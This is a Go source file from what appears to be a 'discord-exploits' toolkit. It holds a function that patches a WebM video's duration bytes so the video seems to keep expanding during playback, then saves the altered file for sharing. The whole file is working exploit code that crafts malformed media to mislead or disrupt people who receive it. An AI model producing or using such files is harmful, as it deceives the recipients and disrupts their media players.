package exploits

import (
	"bytes"
	"fmt"
	"github.com/Schmenn/discord-exploits/modules"
	"os"
)

// RunExpandingVideoTask edits file so that it keeps expanding while it's getting played
func RunExpandingVideoTask(fileName string) {

	data, err := os.ReadFile(fileName)
	modules.Check(err)
	index := bytes.Index(data, []byte("\x44\x89\x88"))
	if index == -1 {
		fmt.Println("could not find the part of the file that needs to be modified, exiting")
		return
	}

	data[index+3] = 63
	data[index+4] = 240
	data[index+5] = 0
	data[index+6] = 0
	data[index+7] = 0
	data[index+8] = 0
	data[index+9] = 0
	data[index+10] = 0

	name := modules.CreateName("webm")

	fmt.Println("Saved video to: " + name)

	err = os.WriteFile(name, data, os.FileMode(0777))
	if err != nil {
		panic(err)
	}
}
